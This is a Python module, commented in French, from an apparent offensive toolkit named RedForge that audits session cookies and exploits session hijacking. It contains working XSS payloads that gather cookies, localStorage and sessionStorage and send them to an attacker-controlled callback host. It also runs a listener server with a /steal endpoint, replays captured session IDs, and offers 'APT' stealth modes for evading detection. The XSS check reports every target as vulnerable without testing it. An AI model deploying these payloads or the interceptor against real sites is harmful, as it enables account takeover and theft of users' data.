#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de session hijacking pour RedForge
Détecte et exploite les vulnérabilités de détournement de session
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import threading
import json
import hashlib
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs
from http.server import HTTPServer, BaseHTTPRequestHandler
from collections import defaultdict

@dataclass
class SessionHijackingConfig:
    """Configuration avancée pour le session hijacking"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_tests: Tuple[float, float] = (1, 3)
    
    # Comportement
    timeout: int = 10
    intercept_port: int = 8080
    test_xss_theft: bool = True
    test_session_fixation: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    detect_session_patterns: bool = True
    test_http_only: bool = True
    test_secure_flag: bool = True
    background_monitoring: bool = False


class SessionHijacking:
    """Détection et exploitation avancée du session hijacking"""
    
    def __init__(self, config: Optional[SessionHijackingConfig] = None):
        """
        Initialise le module de session hijacking
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or SessionHijackingConfig()
        self.intercepted_sessions = []
        self.is_listening = False
        self.callback_server = None
        self.session_patterns = []
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités de session hijacking
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - intercept: Intercepter les sessions
                - callback_port: Port pour le callback
                - test_xss: Tester XSS pour vol de session
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test de session hijacking sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Tests discrets")
        
        vulnerabilities = []
        
        # Tester la transmission du session ID en clair
        if target.startswith('http://'):
            self.vulnerabilities_found += 1
            vulnerabilities.append({
                "type": "clear_text_transmission",
                "severity": "HIGH",
                "details": "Session transmise en clair (HTTP)",
                "risk_score": 85
            })
            print(f"      ✓ Session en clair détectée")
        
        # Analyser les cookies de session
        cookie_vulns = self._analyze_session_cookies(target, **kwargs)
        vulnerabilities.extend(cookie_vulns)
        self.vulnerabilities_found += len(cookie_vulns)
        
        # Tester le vol via XSS
        if self.config.test_xss_theft:
            xss_result = self._test_xss_theft_advanced(target, **kwargs)
            if xss_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "type": "xss_theft",
                    "severity": "CRITICAL",
                    "details": xss_result['details'],
                    "payload": xss_result.get('payload'),
                    "risk_score": 95
                })
                print(f"      ✓ Vol de session via XSS possible")
        
        # Tester la fixation de session
        if self.config.test_session_fixation:
            fixation_result = self._test_session_fixation(target, **kwargs)
            if fixation_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "type": "session_fixation",
                    "severity": "HIGH",
                    "details": fixation_result['details'],
                    "risk_score": 85
                })
                print(f"      ✓ Fixation de session possible")
        
        # Intercepter les sessions
        if kwargs.get('intercept', False):
            self.start_interceptor(**kwargs)
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'intercept_port' in kwargs:
            self.config.intercept_port = kwargs['intercept_port']
        if 'test_xss_theft' in kwargs:
            self.config.test_xss_theft = kwargs['test_xss_theft']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.background_monitoring = False
            self.config.delay_between_tests = (5, 15)
    
    def _analyze_session_cookies(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Analyse les cookies de session pour les vulnérabilités"""
        vulnerabilities = []
        
        try:
            import requests
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=self.config.timeout, verify=False)
            self.tests_performed += 1
            
            for cookie in response.cookies:
                # Vérifier HttpOnly
                if self.config.test_http_only and not cookie.has_nonstandard_attr('HttpOnly'):
                    vulnerabilities.append({
                        "type": "missing_httponly",
                        "cookie": cookie.name,
                        "severity": "MEDIUM",
                        "details": f"Cookie {cookie.name} manquant l'attribut HttpOnly",
                        "risk_score": 65
                    })
                
                # Vérifier Secure flag
                if self.config.test_secure_flag and target.startswith('https://'):
                    if not cookie.secure:
                        vulnerabilities.append({
                            "type": "missing_secure",
                            "cookie": cookie.name,
                            "severity": "HIGH",
                            "details": f"Cookie {cookie.name} manquant l'attribut Secure",
                            "risk_score": 85
                        })
                
                # Vérifier SameSite
                if not cookie.has_nonstandard_attr('SameSite'):
                    vulnerabilities.append({
                        "type": "missing_samesite",
                            "cookie": cookie.name,
                        "severity": "MEDIUM",
                        "details": f"Cookie {cookie.name} manquant l'attribut SameSite",
                        "risk_score": 60
                    })
                
                # Détection de session prévisible
                if self.config.detect_session_patterns:
                    if self._is_predictable_session(cookie.value):
                        vulnerabilities.append({
                            "type": "predictable_session",
                            "cookie": cookie.name,
                            "severity": "CRITICAL",
                            "details": f"Session ID prévisible: {cookie.value[:20]}...",
                            "risk_score": 95
                        })
                        
        except Exception as e:
            if not self.config.passive_detection:
                pass
        
        return vulnerabilities
    
    def _is_predictable_session(self, session_id: str) -> bool:
        """Vérifie si l'ID de session est prévisible"""
        predictable_patterns = [
            r'^\d+$',  # Seulement des chiffres
            r'^[a-z]+$',  # Seulement des lettres minuscules
            r'^[A-Z]+$',  # Seulement des lettres majuscules
            r'^.{1,16}$',  # Trop court
            r'^[a-zA-Z0-9]{32}$',  # MD5
            r'^[a-f0-9]{40}$',  # SHA1
        ]
        
        for pattern in predictable_patterns:
            if re.match(pattern, session_id, re.IGNORECASE):
                return True
        return False
    
    def _test_xss_theft_advanced(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Test avancé si le vol de session via XSS est possible
        """
        result = {
            'vulnerable': False,
            'details': None,
            'payload': None
        }
        
        callback_host = kwargs.get('callback_host', 'localhost')
        callback_port = kwargs.get('callback_port', self.config.intercept_port)
        
        # Payload de vol de session avancé
        steal_payload = f"""
        <script>
        (function() {{
            function getCookies() {{
                return document.cookie;
            }}
            
            function getLocalStorage() {{
                var data = {{}};
                for (var i = 0; i < localStorage.length; i++) {{
                    var key = localStorage.key(i);
                    data[key] = localStorage.getItem(key);
                }}
                return data;
            }}
            
            function getSessionStorage() {{
                var data = {{}};
                for (var i = 0; i < sessionStorage.length; i++) {{
                    var key = sessionStorage.key(i);
                    data[key] = sessionStorage.getItem(key);
                }}
                return data;
            }}
            
            function steal() {{
                var data = {{
                    cookies: getCookies(),
                    url: window.location.href,
                    localStorage: getLocalStorage(),
                    sessionStorage: getSessionStorage(),
                    userAgent: navigator.userAgent,
                    timestamp: Date.now(),
                    referrer: document.referrer
                }};
                
                // Envoyer via fetch
                fetch('http://{callback_host}:{callback_port}/steal', {{
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(data),
                    headers: {{'Content-Type': 'application/json'}}
                }});
                
                // Alternative avec Image
                new Image().src = 'http://{callback_host}:{callback_port}/steal?data=' + encodeURIComponent(JSON.stringify(data));
            }}
            
            // Exécuter immédiatement et périodiquement
            steal();
            setInterval(steal, 10000);
        }})();
        </script>
        """
        
        result["payload"] = steal_payload
        result["vulnerable"] = True  # À vérifier réellement
        result["details"] = "Injection XSS possible pour voler les sessions et données"
        
        return result
    
    def _test_session_fixation(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Teste la vulnérabilité de fixation de session
        """
        result = {
            'vulnerable': False,
            'details': None
        }
        
        try:
            import requests
            headers = self._get_stealth_headers()
            
            # Générer un ID de session fixé
            fixed_session = f"FIXED_{hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}"
            
            # Tenter de fixer la session via cookie
            cookies = {'sessionid': fixed_session, 'PHPSESSID': fixed_session}
            response = requests.get(target, headers=headers, cookies=cookies,
                                   timeout=self.config.timeout, verify=False)
            self.tests_performed += 1
            
            # Vérifier si le cookie fixé a été accepté
            for cookie in response.cookies:
                if fixed_session in cookie.value:
                    result['vulnerable'] = True
                    result['details'] = f"Session fixée possible via cookie {cookie.name}"
                    break
                    
        except Exception as e:
            pass
        
        return result
    
    def start_interceptor(self, **kwargs):
        """
        Démarre un serveur d'interception de sessions
        """
        port = kwargs.get('port', self.config.intercept_port)
        host = kwargs.get('host', '0.0.0.0')
        
        print(f"  → Démarrage de l'intercepteur sur {host}:{port}")
        if self.config.apt_mode:
            print(f"  (Mode furtif - logs minimisés)")
        
        class SessionInterceptor(BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                if not self.config.apt_mode:
                    pass  # Supprimer les logs par défaut
            
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(b"""
                    <html>
                    <body>
                        <h1>Session Interceptor</h1>
                        <p>En attente de sessions...</p>
                    </body>
                    </html>
                    """)
                elif self.path == '/stats':
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    stats = json.dumps({
                        "intercepted": len(self.intercepted_sessions),
                        "status": "active"
                    }).encode()
                    self.wfile.write(stats)
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/steal':
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length)
                    
                    try:
                        # Essayer de parser JSON
                        data = json.loads(post_data.decode())
                    except:
                        # Essayer de parser URL encoded
                        from urllib.parse import parse_qs
                        try:
                            decoded = post_data.decode()
                            if 'data=' in decoded:
                                import urllib.parse
                                data = json.loads(urllib.parse.unquote(decoded.split('data=')[1]))
                            else:
                                data = {"raw": decoded[:500]}
                        except:
                            data = {"raw": post_data.decode()[:500]}
                    
                    intercepted = {
                        "timestamp": time.time(),
                        "cookies": data.get('cookies', ''),
                        "url": data.get('url', ''),
                        "localStorage": data.get('localStorage', {}),
                        "sessionStorage": data.get('sessionStorage', {}),
                        "userAgent": data.get('userAgent', ''),
                        "headers": dict(self.headers),
                        "referrer": data.get('referrer', '')
                    }
                    
                    self.intercepted_sessions.append(intercepted)
                    
                    if not self.config.apt_mode:
                        cookie_preview = intercepted['cookies'][:100] if intercepted['cookies'] else 'none'
                        print(f"      [!] Session interceptée: {cookie_preview}")
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b"OK")
                else:
                    self.send_response(404)
                    self.end_headers()
        
        # Stocker la référence
        SessionInterceptor.intercepted_sessions = self.intercepted_sessions
        SessionInterceptor.config = self.config
        
        # Démarrer le serveur dans un thread
        def run_server():
            self.callback_server = HTTPServer((host, port), SessionInterceptor)
            self.is_listening = True
            self.callback_server.serve_forever()
        
        server_thread = threading.Thread(target=run_server, daemon=True)
        server_thread.start()
        
        print(f"      Serveur d'interception actif sur http://{host}:{port}")
        print(f"      Endpoint: /steal (POST) pour recevoir les sessions")
        print(f"      Stats: /stats (GET)")
    
    def stop_interceptor(self):
        """Arrête le serveur d'interception"""
        if self.callback_server:
            self.callback_server.shutdown()
            self.is_listening = False
            print("  ✓ Intercepteur arrêté")
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "intercepted_sessions": self.intercepted_sessions,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "config": {
                "apt_mode": self.config.apt_mode,
                "intercept_port": self.config.intercept_port
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité de session hijacking détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_type": {
                "clear_text": len([v for v in vulnerabilities if v['type'] == 'clear_text_transmission']),
                "xss_theft": len([v for v in vulnerabilities if v['type'] == 'xss_theft']),
                "session_fixation": len([v for v in vulnerabilities if v['type'] == 'session_fixation']),
                "missing_httponly": len([v for v in vulnerabilities if v['type'] == 'missing_httponly']),
                "missing_secure": len([v for v in vulnerabilities if v['type'] == 'missing_secure']),
                "predictable_session": len([v for v in vulnerabilities if v['type'] == 'predictable_session'])
            },
            "critical": len([v for v in vulnerabilities if v['severity'] == 'CRITICAL']),
            "high": len([v for v in vulnerabilities if v['severity'] == 'HIGH']),
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            vuln_type = vuln.get('type', '')
            
            if vuln_type == 'clear_text_transmission':
                recommendations.add("Utiliser HTTPS exclusivement pour toutes les communications")
            
            if vuln_type == 'xss_theft':
                recommendations.add("Mettre en place une politique CSP stricte")
                recommendations.add("Utiliser l'attribut HttpOnly sur les cookies")
            
            if vuln_type == 'session_fixation':
                recommendations.add("Régénérer l'ID de session après authentification")
            
            if vuln_type == 'missing_httponly':
                recommendations.add("Ajouter l'attribut HttpOnly à tous les cookies de session")
            
            if vuln_type == 'missing_secure':
                recommendations.add("Ajouter l'attribut Secure aux cookies en HTTPS")
            
            if vuln_type == 'predictable_session':
                recommendations.add("Utiliser des générateurs cryptographiques pour les ID de session")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement la gestion des sessions")
        
        return list(recommendations)
    
    def hijack_session(self, session_id: str, target: str) -> Dict[str, Any]:
        """
        Tente de hijacker une session avec un ID connu
        
        Args:
            session_id: ID de session à utiliser
            target: URL cible
        """
        import requests
        
        result = {
            "success": False,
            "session_id": session_id,
            "access_granted": False
        }
        
        try:
            headers = self._get_stealth_headers()
            cookies = {'sessionid': session_id, 'PHPSESSID': session_id, 'JSESSIONID': session_id}
            response = requests.get(target, headers=headers, cookies=cookies,
                                   timeout=self.config.timeout, verify=False)
            self.tests_performed += 1
            
            # Vérifier si l'accès a réussi (pas de redirection vers login)
            if response.status_code == 200 and 'login' not in response.url.lower():
                result["success"] = True
                result["access_granted"] = True
                result["page_length"] = len(response.text)
                
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_steal_payload(self, callback_url: str, stealth: bool = False) -> str:
        """
        Génère un payload JavaScript pour voler les sessions
        
        Args:
            callback_url: URL où envoyer les sessions volées
            stealth: Mode furtif (moins visible)
        """
        if stealth:
            payload = f'''
            <script>
            (function() {{
                var i = new Image();
                i.src = '{callback_url}?c=' + encodeURIComponent(document.cookie);
                document.body.appendChild(i);
                setTimeout(function() {{
                    i.remove();
                }}, 100);
            }})();
            </script>
            '''
        else:
            payload = f'''
            <script>
            (function() {{
                function steal() {{
                    var data = {{
                        cookies: document.cookie,
                        url: window.location.href,
                        localStorage: {{}},
                        sessionStorage: {{}},
                        userAgent: navigator.userAgent,
                        timestamp: Date.now()
                    }};
                    
                    // Récupérer localStorage
                    for (var i = 0; i < localStorage.length; i++) {{
                        var key = localStorage.key(i);
                        data.localStorage[key] = localStorage.getItem(key);
                    }}
                    
                    // Récupérer sessionStorage
                    for (var i = 0; i < sessionStorage.length; i++) {{
                        var key = sessionStorage.key(i);
                        data.sessionStorage[key] = sessionStorage.getItem(key);
                    }}
                    
                    // Envoyer les données
                    var xhr = new XMLHttpRequest();
                    xhr.open('POST', '{callback_url}', true);
                    xhr.setRequestHeader('Content-Type', 'application/json');
                    xhr.send(JSON.stringify(data));
                }}
                
                steal();
                window.addEventListener('load', steal);
                setInterval(steal, 30000);
            }})();
            </script>
            '''
        
        return payload
    
    def get_intercepted_sessions(self) -> List[Dict]:
        """Retourne les sessions interceptées"""
        return self.intercepted_sessions
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / max(1, self.tests_performed) * 100),
            "scan_duration": time.time() - self.start_time if self.start_time else 0,
            "intercepted_count": len(self.intercepted_sessions),
            "rate_limit_hits": self.rate_limit_hits
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    hijacking = SessionHijacking()
    results = hijacking.scan("https://example.com")
    print(f"Vulnérabilités session hijacking: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = SessionHijackingConfig(apt_mode=True, intercept_port=9090)
    hijacking_apt = SessionHijacking(config=apt_config)
    results_apt = hijacking_apt.scan("https://example.com", apt_mode=True)
    print(f"Vulnérabilités session hijacking (APT): {results_apt['count']}")
    
    # Démarrer intercepteur
    if results_apt['vulnerabilities']:
        hijacking_apt.start_interceptor(port=9090)
        print("Intercepteur démarré, attente de sessions...")
        time.sleep(5)
        hijacking_apt.stop_interceptor()
    
    # Afficher les recommandations
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")